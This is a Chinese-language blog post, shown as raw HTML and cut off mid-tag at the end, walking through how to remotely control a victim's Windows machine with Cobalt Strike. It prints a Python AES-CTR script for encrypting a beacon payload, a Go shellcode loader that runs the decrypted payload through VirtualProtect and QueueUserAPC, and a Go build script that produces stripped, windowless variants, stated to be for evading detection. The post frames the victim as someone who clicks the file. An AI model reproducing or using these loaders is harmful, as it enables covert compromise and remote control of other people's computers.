<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>cs遥控对方主机流程 | xx的博客</title><meta name="author" content="Hack xx"><meta name="copyright" content="Hack xx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="记录一次用cs4.3遥控对方小时候你们是否觉得黑客遥控人家电脑很酷？自己也想尝试去操作，但是感觉无从下手 ，拔剑四顾心茫然的感觉。其实原理很简单，就是利用cobaltstrike生成一个beacon，然后受害者点击这个beacon点击这个可运行的beacon的时候，cs服务器可以看到上线。 首先我们创建一个raw类型的payload，如图所示: 生成之后ftp到你的windows上面。 然后用一个">
<meta property="og:type" content="article">
<meta property="og:title" content="cs遥控对方主机流程">
<meta property="og:url" content="http://example.com/2025/09/26/cs%E9%81%A5%E6%8E%A7%E5%AF%B9%E6%96%B9%E4%B8%BB%E6%9C%BA%E6%B5%81%E7%A8%8B/index.html">
<meta property="og:site_name" content="xx的博客">
<meta property="og:description" content="记录一次用cs4.3遥控对方小时候你们是否觉得黑客遥控人家电脑很酷？自己也想尝试去操作，但是感觉无从下手 ，拔剑四顾心茫然的感觉。其实原理很简单，就是利用cobaltstrike生成一个beacon，然后受害者点击这个beacon点击这个可运行的beacon的时候，cs服务器可以看到上线。 首先我们创建一个raw类型的payload，如图所示: 生成之后ftp到你的windows上面。 然后用一个">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/img/xx.JPG">
<meta property="article:published_time" content="2025-09-26T08:52:08.000Z">
<meta property="article:modified_time" content="2025-09-26T10:11:54.075Z">
<meta property="article:author" content="Hack xx">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/xx.JPG"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "cs遥控对方主机流程",
  "url": "http://example.com/2025/09/26/cs%E9%81%A5%E6%8E%A7%E5%AF%B9%E6%96%B9%E4%B8%BB%E6%9C%BA%E6%B5%81%E7%A8%8B/",
  "image": "http://example.com/img/xx.JPG",
  "datePublished": "2025-09-26T08:52:08.000Z",
  "dateModified": "2025-09-26T10:11:54.075Z",
  "author": [
    {
      "@type": "Person",
      "name": "Hack xx",
      "url": "http://example.com"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/09/26/cs%E9%81%A5%E6%8E%A7%E5%AF%B9%E6%96%B9%E4%B8%BB%E6%9C%BA%E6%B5%81%E7%A8%8B/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'cs遥控对方主机流程',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">xx的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">cs遥控对方主机流程</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">cs遥控对方主机流程</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-09-26T08:52:08.000Z" title="Created 2025-09-26 16:52:08">2025-09-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-09-26T10:11:54.075Z" title="Updated 2025-09-26 18:11:54">2025-09-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="记录一次用cs4-3遥控对方"><a href="#记录一次用cs4-3遥控对方" class="headerlink" title="记录一次用cs4.3遥控对方"></a>记录一次用cs4.3遥控对方</h1><p>小时候你们是否觉得黑客遥控人家电脑很酷？自己也想尝试去操作，但是感觉无从下手 ，拔剑四顾心茫然的感觉。其实原理很简单，就是利用cobaltstrike生成一个beacon，然后受害者点击这个beacon点击这个可运行的beacon的时候，cs服务器可以看到上线。</p>
<h3 id="首先我们创建一个raw类型的payload，如图所示"><a href="#首先我们创建一个raw类型的payload，如图所示" class="headerlink" title="首先我们创建一个raw类型的payload，如图所示:"></a>首先我们创建一个raw类型的payload，如图所示:</h3><p><img src="https://raw.githubusercontent.com/hack-xx/hu/main/img/11.png"></p>
<p>生成之后ftp到你的windows上面。</p>
<h3 id="然后用一个sgn加密把payload-bin给加密一下"><a href="#然后用一个sgn加密把payload-bin给加密一下" class="headerlink" title="然后用一个sgn加密把payload.bin给加密一下"></a>然后用一个sgn加密把payload.bin给加密一下</h3><p>这里我把sgn的项目放在这里 <a target="_blank" rel="noopener" href="https://github.com/EgeBalci/sgn.git">https://github.com/EgeBalci/sgn.git</a></p>
<p>或者<a target="_blank" rel="noopener" href="https://github.com/EgeBalci/sgn/releases/download/3.0.1/sgn_3.0.1_windows_amd64.exe">https://github.com/EgeBalci/sgn/releases/download/3.0.1/sgn_3.0.1_windows_amd64.exe</a></p>
<p>这里我用的是exe来操作的</p>
<p>下好之后把payload.bin复制到有exe的文件目录，然后打开终端输入:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\sgn.exe -a 64 -c 1 -i payload.bin -o pd.bin</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/hack-xx/hu/main/img/13.png"></p>
<p>如图所示就是加密好了的</p>
<h3 id="再上一个加密，或者其他加密"><a href="#再上一个加密，或者其他加密" class="headerlink" title="再上一个加密，或者其他加密"></a>再上一个加密，或者其他加密</h3><p>我这里用的是一个AES加密来获取加密信息和密钥。这里放代码，第一个是AES。我这里用的是go1.25.0的版本，代码有些版本可能有偏差，可以放deepseek里面修改一下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_file_to_go_bytearray</span>(<span class="params">input_file</span>):</span><br><span class="line">   </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 1. 读取原始二进制文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        raw_data = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 生成随机AES密钥（32字节用于AES-256）</span></span><br><span class="line">    aes_key = os.urandom(<span class="number">32</span>)</span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 3. 生成随机nonce（8字节）</span></span><br><span class="line">    nonce = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. 创建AES-CTR加密器</span></span><br><span class="line">    cipher = AES.new(aes_key, AES.MODE_CTR, nonce=nonce)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5. 加密数据</span></span><br><span class="line">    ciphertext = cipher.encrypt(raw_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 6. 组合nonce和密文</span></span><br><span class="line">    encrypted_data = nonce + ciphertext</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 7. 生成Go语言格式的输出</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">format_bytearray</span>(<span class="params">data, var_name</span>):</span><br><span class="line">        lines = []</span><br><span class="line">        line = <span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span> := []byte&#123;&#123;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">12</span> == <span class="number">0</span>:</span><br><span class="line">                lines.append(line)</span><br><span class="line">                line = <span class="string">&quot;    &quot;</span></span><br><span class="line">            line += <span class="string">f&quot;0x<span class="subst">&#123;byte:02x&#125;</span>, &quot;</span></span><br><span class="line">        line = line.rstrip(<span class="string">&quot;, &quot;</span>) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">        lines.append(line)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\n&quot;</span>.join(lines)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 格式化输出</span></span><br><span class="line">    go_encrypted = format_bytearray(encrypted_data, <span class="string">&quot;encryptedData&quot;</span>)</span><br><span class="line">    go_key = format_bytearray(aes_key, <span class="string">&quot;aesKey&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> go_encrypted, go_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_file = <span class="string">&quot;E:\钓鱼\pd.bin&quot;</span>  <span class="comment"># 替换为你的.bin文件路径</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        encrypted_data, aes_key = encrypt_file_to_go_bytearray(input_file)</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;// 加密后的数据（复制到Go代码中使用）:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(encrypted_data)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n// AES密钥（解密时需要，请妥善保存）:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(aes_key)</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n// 完整的Go解密数据变量定义:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;var (\n    <span class="subst">&#123;aes_key&#125;</span>\n    <span class="subst">&#123;encrypted_data&#125;</span>\n)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;加密失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/hack-xx/hu/main/img/14.png"></p>
<p>这是运行后得到的东西，把得到的加密数据和密钥放到下一个脚本里面命名为loder.go</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;crypto/aes&quot;</span><br><span class="line">	&quot;crypto/cipher&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;log&quot;</span><br><span class="line">	&quot;syscall&quot;</span><br><span class="line">	&quot;unsafe&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">// decryptAES 使用AES-CTR模式解密数据</span><br><span class="line">func decryptAES(key, encryptedData []byte) ([]byte, error) &#123;</span><br><span class="line">	// 1. 创建AES cipher</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return nil, fmt.Errorf(&quot;aes.NewCipher failed: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 2. 检查最小长度（8字节nonce）</span><br><span class="line">	if len(encryptedData) &lt; 8 &#123;</span><br><span class="line">		return nil, fmt.Errorf(&quot;encrypted data too short (min 8 bytes)&quot;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 3. 提取nonce（前8字节）和密文</span><br><span class="line">	nonce := encryptedData[:8]</span><br><span class="line">	ciphertext := encryptedData[8:]</span><br><span class="line"></span><br><span class="line">	// 4. 创建16字节IV（nonce + zero counter）</span><br><span class="line">	iv := make([]byte, 16)</span><br><span class="line">	copy(iv, nonce) // 前8字节为nonce，后8字节保持为0</span><br><span class="line"></span><br><span class="line">	// 5. 创建CTR流解密器</span><br><span class="line">	stream := cipher.NewCTR(block, iv)</span><br><span class="line"></span><br><span class="line">	// 6. 解密数据</span><br><span class="line">	plaintext := make([]byte, len(ciphertext))</span><br><span class="line">	stream.XORKeyStream(plaintext, ciphertext)</span><br><span class="line"></span><br><span class="line">	return plaintext, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	var (</span><br><span class="line">		aesKey = []byte&#123;&quot;在这里放密钥&quot;&#125;</span><br><span class="line">		encryptedData = []byte&#123;&quot;在2这里放入加密数据&quot;&#125;</span><br><span class="line">	)</span><br><span class="line">	decrypted, err := decryptAES(aesKey, encryptedData)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;解密失败: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line">	kernel32 := syscall.NewLazyDLL(&quot;kernel32.dll&quot;)</span><br><span class="line">	virtualProtect := kernel32.NewProc(&quot;VirtualProtect&quot;)</span><br><span class="line">	getProcAddress := kernel32.NewProc(&quot;GetProcAddress&quot;)</span><br><span class="line">	getModuleHandle := kernel32.NewProc(&quot;GetModuleHandleA&quot;)</span><br><span class="line">	queueUserAPC := kernel32.NewProc(&quot;QueueUserAPC&quot;)</span><br><span class="line">	getCurrentThread := kernel32.NewProc(&quot;GetCurrentThread&quot;)</span><br><span class="line">	var oldProtect uint32</span><br><span class="line"></span><br><span class="line">	// 修改 shellcode 所在内存区域的保护属性，允许执行</span><br><span class="line">	_, _, _ = syscall.SyscallN(</span><br><span class="line">		virtualProtect.Addr(),</span><br><span class="line">		uintptr(unsafe.Pointer(&amp;decrypted[0])),</span><br><span class="line">		uintptr(len(decrypted)),</span><br><span class="line">		syscall.PAGE_EXECUTE_READWRITE,</span><br><span class="line">		uintptr(unsafe.Pointer(&amp;oldProtect)),</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	// 获取模块句柄 - 使用 BytePtrFromString 替代 StringBytePtr</span><br><span class="line">	ntdllPtr, err := syscall.BytePtrFromString(&quot;ntdll.dll&quot;)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;BytePtrFromString failed: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ntdllHandle, _, _ := syscall.SyscallN(</span><br><span class="line">		getModuleHandle.Addr(),</span><br><span class="line">		uintptr(unsafe.Pointer(ntdllPtr)),</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	// 获取函数地址 - 使用 BytePtrFromString 替代 StringBytePtr</span><br><span class="line">	ntTestAlertPtr, err := syscall.BytePtrFromString(&quot;NtTestAlert&quot;)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;BytePtrFromString failed: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ntTestAlertAddr, _, _ := syscall.SyscallN(</span><br><span class="line">		getProcAddress.Addr(),</span><br><span class="line">		ntdllHandle,</span><br><span class="line">		uintptr(unsafe.Pointer(ntTestAlertPtr)),</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	// 向当前线程的 APC 队列添加一个执行 shellcode 的任务</span><br><span class="line">	currentThread, _, _ := syscall.SyscallN(getCurrentThread.Addr())</span><br><span class="line"></span><br><span class="line">	_, _, _ = syscall.SyscallN(</span><br><span class="line">		queueUserAPC.Addr(),</span><br><span class="line">		uintptr(unsafe.Pointer(&amp;decrypted[0])),</span><br><span class="line">		currentThread,</span><br><span class="line">		0,</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	// 调用 NtTestAlert，触发 APC 队列中的任务执行</span><br><span class="line">	syscall.SyscallN(ntTestAlertAddr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>点击运行以后可以看到上机成功</p>
<p><img src="https://raw.githubusercontent.com/hack-xx/hu/main/img/15.png"></p>
<p>其实这个其实就已经算成功了，可以遥控对方了，但是这是没有编译好的文件，因此我们可以编译一下这个文件。go bulild loder.go</p>
<p>不过我看了一个大佬的文章，他没直接编译，而是写了一个脚本来混淆编译，其目的是</p>
<p>生成多样化的载荷</p>
<ul>
<li>避免单一特征被检测</li>
<li>适应不同目标环境</li>
<li>保持功能一致的变体</li>
</ul>
<p>这里我把代码也贴出来,定为fuzz.go</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;flag&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;math/rand&quot;</span><br><span class="line">	&quot;os&quot;</span><br><span class="line">	&quot;os/exec&quot;</span><br><span class="line">	&quot;path/filepath&quot;</span><br><span class="line">	&quot;strings&quot;</span><br><span class="line">	&quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">const (</span><br><span class="line">	resultDir    = &quot;result&quot;</span><br><span class="line">	randomLength = 8</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var buildConfigs = [][]string&#123;</span><br><span class="line">	&#123;&#125;,</span><br><span class="line">	&#123;&quot;-race&quot;&#125;,</span><br><span class="line">	&#123;&quot;-trimpath&quot;&#125;,</span><br><span class="line">	&#123;&quot;-ldflags&quot;, &quot;-w&quot;&#125;,</span><br><span class="line">	&#123;&quot;-ldflags&quot;, &quot;-s&quot;&#125;,</span><br><span class="line">	&#123;&quot;-ldflags&quot;, &quot;-H=windowsgui&quot;&#125;,</span><br><span class="line">	&#123;&quot;-ldflags&quot;, &quot;-w -s&quot;&#125;,</span><br><span class="line">	&#123;&quot;-trimpath&quot;, &quot;-ldflags&quot;, &quot;-w -s&quot;&#125;,</span><br><span class="line">	&#123;&quot;-ldflags&quot;, &quot;-w -s -H=windowsgui&quot;&#125;,</span><br><span class="line">	&#123;&quot;-trimpath&quot;, &quot;-ldflags&quot;, &quot;-w -s -H=windowsgui&quot;&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	sourceFile := flag.String(&quot;f&quot;, &quot;&quot;, &quot;要编译的Go源文件路径&quot;)</span><br><span class="line">	flag.Parse()</span><br><span class="line"></span><br><span class="line">	if *sourceFile == &quot;&quot; &#123;</span><br><span class="line">		fmt.Println(&quot;必须使用 -f 参数指定源文件&quot;)</span><br><span class="line">		flag.Usage()</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	os.MkdirAll(resultDir, os.ModePerm)</span><br><span class="line">	rand.Seed(time.Now().UnixNano())</span><br><span class="line"></span><br><span class="line">	for _, params := range buildConfigs &#123;</span><br><span class="line">		exeName := generateRandomName() + &quot;.exe&quot;</span><br><span class="line">		outputPath := filepath.Join(resultDir, exeName)</span><br><span class="line"></span><br><span class="line">		cmdArgs := buildCommand(params, outputPath, *sourceFile)</span><br><span class="line">		fmt.Printf(&quot;编译命令: go %s\n&quot;, strings.Join(cmdArgs, &quot; &quot;))</span><br><span class="line"></span><br><span class="line">		if err := compile(cmdArgs); err != nil &#123;</span><br><span class="line">			fmt.Printf(&quot;[-] 编译失败: %v\n&quot;, err)</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			fmt.Printf(&quot;[+] 编译成功: %s\n\n&quot;, outputPath)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func buildCommand(params []string, output, source string) []string &#123;</span><br><span class="line">	return append([]string&#123;&quot;build&quot;, &quot;-o&quot;, output&#125;, append(params, source)...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func compile(args []string) error &#123;</span><br><span class="line">	cmd := exec.Command(&quot;go&quot;, args...)</span><br><span class="line">	if output, err := cmd.CombinedOutput(); err != nil &#123;</span><br><span class="line">		return fmt.Errorf(&quot;%v\n%s&quot;, err, string(output))</span><br><span class="line">	&#125;</span><br><span class="line">	return nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func generateRandomName() string &#123;</span><br><span class="line">	const chars = &quot;test100000&quot;</span><br><span class="line">	b := make([]byte, randomLength)</span><br><span class="line">	for i := range b &#123;</span><br><span class="line">		b[i] = chars[rand.Intn(len(chars))]</span><br><span class="line">	&#125;</span><br><span class="line">	return string(b)</span><br><span class="line">&#125;</span><br><span 